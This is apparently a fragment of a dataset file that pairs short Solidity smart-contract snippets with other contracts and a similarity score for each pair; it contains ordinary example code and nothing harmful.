}"
"contract Array{

    using Library for Library.data;
    mapping(address => Library.data) clusterContract;

    function addCluster(address id) returns(bool){
        if(clusterContract[id].isValue) throw; 
        
        return true; 
    }
}",0.5465430022487885,"contract CryptoEngineerInterface {

    address public gameSponsor;

    function isEngineerContract() external pure returns(bool) {}

    function isContractMiniGame() external pure returns( bool  ) {}

}"
"contract foo is Class { 

  uint currentSupply; 

  constructor foo()
    ParentToken(currentSupply, tok...) { 
  }
}",0.5275543587863876,"contract InstaMaker is CDPResolver {



    uint public version;

    

    

    constructor() public {

        version = 1;

    }



}"
"contract Test {

  function concat(string str1, string str2) returns (string){

        bytes memory bs1 = bytes(str1);
        bytes memory bs2 = bytes(str2);

        uint len1 = bs1.length;
        uint len2 = bs2.length;

        string memory temp = new string(len1 + len2);
        bytes memory result = bytes(temp);

        uint index = 0;
        for (uint i = 0; i < len1; i++) {
            result[index++] = bs1[i];

        }
        for (i = 0; i < len2; i++) {
            result[index++] = bs2[i];

        }
        return string(result);
    }

}",0.5859469390811676,"contract SetherAPIBase {
    event SetherEvent(
        bytes32 setherKPI,
		bytes32 setherToken,
		string 	authToken,
        bytes32 date,
		bytes32 targetId,
		uint8 	level,
		bytes32 accountId,
		bytes32 requestID
	);

	function stringToBytes32(string memory source) internal pure returns (bytes32 result) {
        bytes memory tempEmptyStringTest = bytes(source);
        if (tempEmptyStringTest.length == 0) {
            return 0x0;
        }

        assembly {
            result := mload(add(source, 32))
        }
    }
}"
"contract WalletFactory {

    mapping(address => Wallet[]) wallets;

    function newWallet() payable public returns (Wallet wallet)
    {
        wallet = new Wallet(msg.sender);
        wallets[msg.sender].push(wallet);
        address(wallet).transfer(msg.value);
    }

}",0.5829196923604907,"contract wallet {
    address owner;
    function wallet() {
        owner = msg.sender;
    }
    function transfer(address target) payable {
        target.send(msg.value);
    }
    function kill() {
        if (msg.sender == owner) {
            suicide(owner);
        } else {
            throw;
        }
    }
}"
"contract Record {
    constructor(address ownerAddr, address providerAddr) public {
        IRegister x = IRegister(ownerAddr);
        IRegister y = IRegister(providerAddr);
        string xName = x.getName();
        string yName = y.getName();
    }
}",0.5398023542489157,"contract MasterRule is Ownable {

  address public masterAddr;



  function setMasterAddr(address _newMasterAddr) public onlyOwner {

    masterAddr = _newMasterAddr;

  }



  

  modifier onlyMaster() {

    require(msg.sender == masterAddr);

    _;

  }

}"
"contract B {    

  A a;

  constructor(A _a) public {
      a = _a;
  }

  function aBid() public payable{
    a.bid.value(msg.value)();
  }
}",0.5856349685774859,"contract WETH is Token{
    function deposit() public payable {}
    function withdraw(uint256 amount) public {}
}"
"contract MarketplaceContract{    

  struct SalesReceipt{
        address  address_receipt
        string   nameOfGood 
        uint     amountOfGood 
        uint     Price  
        uint     sumPrice
        address  address_transaction
    }
}",0.5923734230138168,"contract GODGame {
        function updatePlayer(address addr, uint amount) external;
        function getPlayer(address addr) external returns(uint, uint, uint, address, address[]);
    }"
"contract Client {

  Calculator c;

  constructor(address calculator) public {
    c = Calculator(calculator);
  }
}",0.5608951987666198,"contract OwnableStorage {



  address public owner;



  constructor() internal {

    owner = msg.sender;

  }



}"
"contractCreation {
    if sender.Bytes().Cmp(your_allowed_address_here.Bytes())==0 {
        ret, _, st.gas, vmerr = evm.Create(sender, st.data, st.gas, st.value)
    }
}",0.5017902275125963,"contract TokenReceiver {

    

    function tokenFallback(address _sender, uint256 _value, bytes _data) external returns (bool);

}"
"contract A {
    constructor(){}
  
}",0.5518821234447938,"contract Eater{
	function(){
		
	}
}"
"contract B{
    address public address_of_contract_A;
    constructor (){
    A addr_of_a = new A();
    address_of_contract_A = addr_of_a;
    }
    
}",0.5923473500755456,"contract Simple

{

    address public owner;



    constructor (address ownerAddress) public

    {

        owner = ownerAddress;

    }

}"
"contract X {

  struct list{
       string typo;  
       address head;
   }

  mapping (string => list) _list;

  struct node{
     address add;
     address next; 
  }

  mapping (string =>mapping(address=>node)) _node;

  function add(string _typo1,address _addr){
        addToList(_typo1);
        addToNodes(_typo1 , _addr);
  }

  function addToList(string _typo){
    _list[_typo].typo = _typo;
  }

  function addToNodes(string _typo,address _addr){

    _node[_typo][_addr].next = _addr;
    _node[_typo][_addr].add =_addr;

  }

}",0.5473953005936336,"contract FiftyContract {

	mapping (address => mapping (uint => mapping (uint => mapping (uint => treeNode)))) public treeChildren;

	mapping (address => mapping (uint => bool)) public currentNodes;

	mapping (address => mapping (uint => uint)) public nodeIDIndex;

	mapping (address => uint) public membership;

	struct treeNode {

		 address payable ethAddress; 

		 uint nodeType; 

		 uint nodeID;

	}

	uint public spread;

}"
"contract SimpleStorage {
    uint storedData; 
    
}",0.5637645159623964,"contract CryptocupStorage is GameStorage {



}"
